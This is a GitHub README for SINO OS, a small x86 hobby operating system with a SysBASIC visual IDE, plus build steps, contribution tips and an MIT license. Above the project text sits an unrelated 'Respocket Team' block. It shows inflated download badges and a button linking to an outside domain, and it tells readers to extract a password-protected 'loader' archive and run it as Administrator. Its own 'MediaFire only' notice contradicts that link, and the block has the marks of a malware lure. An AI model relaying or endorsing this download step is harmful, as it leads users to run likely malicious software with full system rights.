<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# SINO OS

**SINO OS 0.10 / SysBASIC 0.3.0 — development preview**

**A small x86 desktop OS where you can design, run and install BASIC applications.**

## What makes SINO OS interesting?

SINO brings a desktop and a small application-development workflow into the same experimental operating system. You can explore files, open the visual designer, write BASIC event handlers, preview your program, and choose between a native executable and an installable package. The aim is to make operating-system internals and application development approachable in one inspectable C/assembly codebase.

- **Retro desktop, bilingual interaction:** a classic windowed environment with Chinese and English interfaces and Pinyin input.
- **Visual application development:** SysBASIC combines a form designer, control properties and event code; projects use text-based `.prj`, `.frm` and `.bas` files.
- **Native software distribution:** `.snx` executables and `.sxp` packages connect the IDE, independent installation wizard and application manager.
- **An OS-development learning project:** explore the boot path, protected-mode kernel, user-mode API, installation transactions and experimental networking through the included source and documentation.

### A first visit in five minutes

1. Download and extract a release ZIP, install QEMU, and start the supplied launcher.
2. Explore the desktop and switch the interface language in System Settings.
3. Press **F11** to open SysBASIC and load `/home/user/Projects/First.prj`.
4. Run the example, then inspect its controls, properties and event code.
5. Try the executable/package build choices; use **F8** for the installer and **F9** for application management.

## Screenshots

Actual QEMU captures of the current desktop and applications. Most use the Chinese locale; the language-settings capture shows English. These are runtime screenshots, not mockups.

| Form designer and properties | First project running in the IDE |
| --- | --- |
## Build from source

Requirements: Node.js, GCC/GNU Binutils capable of generating i386 output, and the included NASM 3.02. Set `SINO_TOOLCHAIN` to your GCC/Binutils `bin` directory if the tools are not on PATH.

```powershell
Set-Location '.\Source Code'
powershell -NoProfile -ExecutionPolicy Bypass -File .\build-release.ps1
```

## Scope

This is a runnable learning/development prototype. It supports BIOS/MBR, IDE, standard VGA and PS/2, rather than general physical hardware or UEFI/GPT. SysBASIC implements a BASIC interpreter subset and native SINO packages; it has no VB6/Win32 binary compatibility. Networking is currently validated on loopback. New native applications use Ring 3 isolation; some legacy desktop applications still run in kernel mode.

## Repository and licenses

This repository starts with a clean snapshot of the final distribution's source and documentation. The preinstalled disk, ISO and complete release ZIPs are distributed as Release assets. The verification summary and SHA-256 manifest under `Documentation` describe the original downloadable distribution, not the Git working tree. Private development disks, personal files and old Git history are excluded.


---

## Useful starting points / 从哪里开始

- Clarify English/Chinese documentation and the first-program tutorial.
- Add small, runnable BASIC examples using the supported language subset.
- Add regression cases for the keyboard decoder, parser or package validator.
- Improve UI layout within the existing memory/drawing limits.

文档与翻译、小型可运行示例、键盘/解释器/安装包边界测试，以及有明确范围的界面改进，都是适合开始的任务。

## Make a change / 提交改动

Keep each pull request focused. Preserve the BIOS boot path and existing GUI. Document new limits instead of presenting unsupported features as complete. Follow the existing toolchain and keep third-party license notices.


---

MIT License

Copyright (c) 2026 SINO contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
